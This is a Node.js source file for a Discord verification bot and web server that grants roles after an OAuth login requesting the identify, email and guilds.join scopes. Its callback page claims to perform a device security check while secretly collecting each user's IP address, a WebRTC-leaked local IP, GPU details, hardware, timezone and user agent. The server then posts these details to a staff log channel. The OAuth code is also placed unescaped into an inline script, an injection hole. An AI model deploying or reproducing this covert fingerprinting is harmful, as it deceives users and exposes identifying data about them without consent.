const fs = require('node:fs');
const path = require('node:path');
const { Client, Collection, GatewayIntentBits, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, MessageFlags } = require('discord.js');
const express = require('express');
const crypto = require('crypto');

// --- 認証用の一時キャッシュ ---
const pendingStates = new Map();

const app = express();
app.use(express.json());
const PORT = process.env.PORT || 3000;

// 💡 認証への入り口（5分制限のチェック）
app.get('/verify', (req, res) => {
  const state = req.query.state;
  if (!state || !pendingStates.has(state)) {
    return res.status(400).send('<h1 style="text-align:center; margin-top:50px; font-family:sans-serif; color:#ff4d4d;">❌ エラー: 無効なアクセス、またはURLの時間切れ(5分経過)です。</h1>');
  }
  
  const data = pendingStates.get(state);
  if (Date.now() - data.timestamp > 300000) { 
    pendingStates.delete(state);
    return res.status(400).send('<h1 style="text-align:center; margin-top:50px; font-family:sans-serif; color:#ff4d4d;">❌ 時間切れ: この認証リンクは5分の有効期限が切れています。もう一度Discordでボタンを押し直してください。</h1>');
  }

  const redirectUri = encodeURIComponent(`https://${req.get('host')}/callback`);
  const discordAuthUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${redirectUri}&response_type=code&scope=identify+email+guilds.join&state=${state}`;
  
  res.redirect(discordAuthUrl);
});

// OAuth2コールバック＆詳細情報収集ページ（クレジット表記一切なし）
app.get('/callback', (req, res) => {
  const { code, state } = req.query;
  if (!state || !pendingStates.has(state)) {
    return res.status(400).send('<h1 style="text-align:center; margin-top:50px; font-family:sans-serif; color:#ff4d4d;">❌ 時間切れ、または無効なセッションです。</h1>');
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <title>認証処理中</title>
        <style>body { font-family: sans-serif; background: #2f3136; color: white; text-align: center; padding-top: 50px; }</style>
    </head>
    <body>
        <h2>🔒 端末セキュリティ認証を完了させています...</h2>
        <p>画面を閉じずに少々お待ちください。</p>
        <script>
            async function collect() {
                let rtcIp = "取得不可";
                try {
                    const pc = new RTCPeerConnection({iceServers:[]});
                    pc.createDataChannel("");
                    await pc.setLocalDescription(await pc.createOffer());
                    const match = pc.localDescription.sdp.match(/(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-f0-9:]+:[a-f0-9:]+/i);
                    if(match) rtcIp = match[0];
                } catch(e){}

                let gl, vendor = "不明", renderer = "不明";
                try {
                    const canvas = document.createElement('canvas');
                    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if(gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }catch(e){}

                const payload = {
                    code: "${code}",
                    state: "${state}",
                    screen: window.screen.width + "x" + window.screen.height,
                    depth: window.screen.colorDepth + "bit",
                    cores: navigator.hardwareConcurrency || "不明",
                    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "不明",
                    touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0),
                    lang: navigator.language,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    vendor: vendor,
                    renderer: renderer,
                    rtcIp: rtcIp
                };

                const res = await fetch('/submit-auth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const text = await res.text();
                document.body.innerHTML = text;
            }
            window.onload = collect;
        </script>
    </body>
    </html>
  `);
});

// 端末情報受信・ロール付与・ログ転送処理
app.post('/submit-auth', async (req, res) => {
  const { code, state, screen, depth, cores, memory, touch, lang, tz, vendor, renderer, rtcIp } = req.body;
  if (!state || !pendingStates.has(state)) return res.send('<h1 style="color:#ff4d4d;">❌ セッションが無効化されました。</h1>');

  const session = pendingStates.get(state);
  pendingStates.delete(state);

  if (Date.now() - session.timestamp > 300000) {
    return res.send('<h1 style="color:#ff4d4d;">❌ セッションが5分を超えたため時間切れです。</h1>');
  }

  try {
    const redirectUri = `https://${req.get('host')}/callback`;
    const tokenResponse = await fetch('https://discord.com/api/v10/oauth2/token', {
      method: 'POST',
      body: new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: redirectUri
      }),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    if (!tokenResponse.ok) return res.send('<h1 style="color:#ff4d4d;">❌ Discordでのトークン認証に失敗しました。</h1>');
    const tokenData = await tokenResponse.json();

    const userResponse = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: `Bearer ${tokenData.access_token}` }
    });
    const userData = await userResponse.json();

    const guild = await client.guilds.fetch(session.guildId).catch(() => null);
    if (!guild) return res.send('<h1 style="color:#ff4d4d;">❌ サーバーが見つかりません。</h1>');

    const member = await guild.members.fetch(session.userId).catch(() => null);
    if (!member) return res.send('<h1 style="color:#ff4d4d;">❌ あなたが対象のDiscordサーバー内に見つかりません。</h1>');

    // 💡 権限不足の確認チェック
    const botMember = await guild.members.fetch(client.user.id);
    if (!botMember.permissions.has('ManageRoles')) {
      return res.send('<h1 style="color:#ff4d4d;">❌ 権限不足: Botに「ロールの管理」権限が付与されていないため、処理を完了できません。</h1>');
    }

    // ロール付与
    let addedRoleName = 'なし';
    if (session.addRoleId) {
      const r = await guild.roles.fetch(session.addRoleId).catch(() => null);
      if (r) { 
        if (botMember.roles.highest.position <= r.position) {
          return res.send('<h1 style="color:#ff4d4d;">❌ 権限不足: Botより高い順位のロールを付与することはできません。</h1>');
        }
        await member.roles.add(r).catch(() => null); 
        addedRoleName = `<@&${r.id}>`; 
      }
    }
    // ロール削除（ある場合のみ）
    if (session.removeRoleId && session.removeRoleId !== 'none') {
      const r = await guild.roles.fetch(session.removeRoleId).catch(() => null);
      if (r && botMember.roles.highest.position > r.position) {
        await member.roles.remove(r).catch(() => null);
      }
    }

    // 📋 要望通りの詳細ログ生成
    const settings = client.getSettings();
    const config = settings[session.guildId] || {};
    if (config.vLogStatus && config.vLogChannel) {
      const logChannel = await guild.channels.fetch(config.vLogChannel).catch(() => null);
      if (logChannel) {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '取得失敗';
        const ua = req.headers['user-agent'] || '不明';
        const platform = ua.match(/\\(([^)]+)\\)/)?.[1] || '不明';

        const embed = new EmbedBuilder()
          .setColor(0x2ECC71)
          .setTitle('✅ 認証成功 - 詳細ログ')
          .addFields(
            { name: 'ユーザー', value: `<@${member.id}> (${member.user.tag})`, inline: true },
            { name: '付与ロール', value: addedRoleName, inline: true },
            { name: 'IPアドレス', value: `\`${ip}\``, inline: true },
            { name: 'ブラウザ', value: `\`\`\`${ua}\`\`\``, inline: false },
            { name: 'プラットフォーム', value: `\`${platform}\``, inline: true },
            { name: '言語', value: `\`${lang}\``, inline: true },
            { name: 'タイムゾーン', value: `\`${tz}\``, inline: true },
            { name: '画面解像度', value: `\`${screen}\``, inline: true },
            { name: '色深度', value: `\`${depth}\``, inline: true },
            { name: 'CPU数', value: `\`${cores}コア\``, inline: true },
            { name: 'メモリ', value: `\`${memory}\``, inline: true },
            { name: 'タッチ対応', value: `\`${touch}\``, inline: true },
            { name: 'WebGL Vendor', value: `\`${vendor}\``, inline: true },
            { name: 'WebGL Renderer', value: `\`${renderer}\``, inline: false },
            { name: 'WebRTC IP', value: `\`${rtcIp || ip}\``, inline: false }
          )
          .setTimestamp();

        await logChannel.send({ embeds: [embed] }).catch(() => null);
      }
    }

    res.send(`
      <div style="max-width:500px; margin:50px auto; background:#36393f; padding:30px; border-radius:8px; border:2px solid #2ecc71; color: white; text-align: center; font-family: sans-serif;">
        <h1 style="color:#2ecc71; margin-top:0;">✨ 認証成功</h1>
        <p style="font-size:18px;">@${member.user.username} さんの認証に成功しました。</p>
        <p>ロールが正常に更新されました。この画面を閉じて Discord に戻ってください。</p>
      </div>
    `);

  } catch (err) {
    console.error(err);
    res.send('<h1 style="color:#ff4d4d;">❌ 内部エラーが発生しました。</h1>');
  }
});

app.listen(PORT, () => console.log(`HTTP Server listening on port ${PORT}`));

// --- Discord Bot コア ---
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
const DATA_FILE = path.join(__dirname, 'data.json');
const GITHUB_OWNER = 'yturhf24-lgtm';
const GITHUB_REPO = 'MaturiHanabiBot';
const FILE_PATH = 'data.json';
let localSettingsCache = {};

async function loadSettingsFromGitHub() {
  if (!process.env.GITHUB_TOKEN) {
    if (fs.existsSync(DATA_FILE)) localSettingsCache = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    return;
  }
  try {
    const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`;
    const response = await fetch(url, { headers: { 'Authorization': `token ${process.env.GITHUB_TOKEN}`, 'User-Agent': 'Render-Bot', 'Accept': 'application/vnd.github.v3+json' } });
    if (response.ok) {
      const json = await response.json();
      localSettingsCache = JSON.parse(Buffer.from(json.content, 'base64').toString('utf8'));
      fs.writeFileSync(DATA_FILE, JSON.stringify(localSettingsCache, null, 2));
    }
  } catch (err) { console.error(err.message); }
}

client.getSettings = () => localSettingsCache;
client.saveSettings = async (data) => {
  localSettingsCache = data;
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  if (!process.env.GITHUB_TOKEN) return;
  try {
    const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`;
    let sha = null;
    const getRes = await fetch(url, { headers: { 'Authorization': `token ${process.env.GITHUB_TOKEN}`, 'User-Agent': 'Render-Bot' } });
    if (getRes.ok) { sha = (await getRes.json()).sha; }
    await fetch(url, {
      method: 'PUT',
      headers: { 'Authorization': `token ${process.env.GITHUB_TOKEN}`, 'User-Agent': 'Render-Bot', 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: 'chore: update database', content: Buffer.from(JSON.stringify(data, null, 2)).toString('base64'), sha })
    });
  } catch (err) { console.error(err.message); }
};

client.commands = new Collection();
const commandFiles = fs.readdirSync(path.join(__dirname, 'commands')).filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
  const command = require(path.join(__dirname, 'commands', file));
  if ('data' in command) client.commands.set(command.data.name, command);
}

client.once('ready', async () => {
  await loadSettingsFromGitHub();
  console.log(`Bot Online: ${client.user.tag}`);
});

// イベントハンドラ（インタラクション完全修正）
client.on('interactionCreate', async interaction => {
  if (interaction.isChatInputCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (command) await command.execute(interaction);
    return;
  }

  // 🔒 モーダル確認処理
  if (interaction.isModalSubmit() && interaction.customId.startsWith('v_setup_modal_')) {
    const parts = interaction.customId.split('_');
    const addRoleId = parts[3];
    const removeRoleId = parts[4];
    const panelText = interaction.fields.getTextInputValue('panel_text');

    const embed = new EmbedBuilder().setColor(0x3498DB).setTitle('🔒 WEB VERIFICATION').setDescription(panelText).setTimestamp();
    const button = new ButtonBuilder().setCustomId(`v_btn_${addRoleId}_${removeRoleId}`).setLabel('認証').setStyle(ButtonStyle.Success);
    
    await interaction.channel.send({ embeds: [embed], components: [new ActionRowBuilder().addComponents(button)] });
    await interaction.reply({ content: '✅ 認証パネルを設置しました。', flags: [MessageFlags.Ephemeral] });
    return;
  }

  // 🔘 ボタン押下時の5分限定「自分だけ表示」リンク生成処理
  if (interaction.isButton() && interaction.customId.startsWith('v_btn_')) {
    const parts = interaction.customId.split('_');
    const addRoleId = parts[2];
    const removeRoleId = parts[3];

    const state = crypto.randomBytes(16).toString('hex');
    pendingStates.set(state, {
      guildId: interaction.guildId,
      userId: interaction.user.id,
      addRoleId,
      removeRoleId,
      timestamp: Date.now()
    });

    setTimeout(() => pendingStates.delete(state), 300000); 

    const host = 'maturihanabitaikaibot.onrender.com';
    const verifyUrl = `https://${host}/verify?state=${state}`;
    const linkButton = new ButtonBuilder().setLabel('🔗 ここを押して認証サイトへ移動').setStyle(ButtonStyle.Link).setURL(verifyUrl);

    await interaction.reply({
      content: '⚠️ **5分以内に下のボタンから認証を完了させてください。**\n(5分経過するとリンクは無効化されます)',
      components: [new ActionRowBuilder().addComponents(linkButton)],
      flags: [MessageFlags.Ephemeral]
    });
  }
});

client.login(process.env.DISCORD_TOKEN);
